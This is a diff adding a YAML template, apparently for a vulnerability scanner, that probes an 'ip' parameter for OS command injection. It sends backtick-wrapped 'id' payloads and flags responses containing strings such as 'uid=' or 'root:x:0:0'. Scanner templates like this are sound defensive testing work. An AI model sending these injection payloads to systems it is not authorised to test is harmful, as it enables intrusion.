@@ -1,0 +1,25 @@
+id: cmdi-018
+name: 'OS command injection via ip'
+severity: critical
+type: active
+tags:
+  - cmdi
+  - injection
+  - rce
+description: 'OS command runs via ip'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      ip:
+        - '`id`'
+        - '`id` #'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'uid='
+          - 'gid='
+          - 'root:x:0:0'
+          - 'bin/bash'
+          - 'www-data'
